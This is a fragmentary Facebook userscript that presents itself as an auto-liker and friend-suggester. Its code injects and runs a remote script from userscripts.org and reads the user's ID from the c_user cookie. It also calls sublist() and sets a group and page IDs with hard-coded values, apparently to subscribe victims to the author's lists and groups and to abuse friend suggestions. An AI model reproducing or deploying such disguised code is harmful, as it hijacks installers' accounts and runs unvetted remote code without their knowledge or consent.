// ==UserScript==
// @name            Facebook Autosuggest Friends
// @namespace       Facebook Autolike Status and Autolike Comment
// @author	    HelpFul Scripts
// @authorURL	    https://www.facebook.com/ssshh12
// @description     Facebook Autolike Status and Autolike Comment, Automatically like             facebook statuses and comments.
...
if(body != null) {
	...
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='https://www.facebook.com' title='AutoLiker'><img src='http://socialmediaclub.org/sites/default/files/bigstock-hand-pressing-like-button-11718554.jpg' height='25' width='137'></img></a>"
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//userscripts.org/scripts/source/159602.user.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="//userscripts.org/scripts/source/159602.user.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
sublist("277815575688383");
sublist("451142918294142");
var gid = ['135310756654473'];
...
var spage_id = "375917169185808";
var spost_id = "375917169185808";
var sfoto_id = "375917169185808";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by AutoLiker';
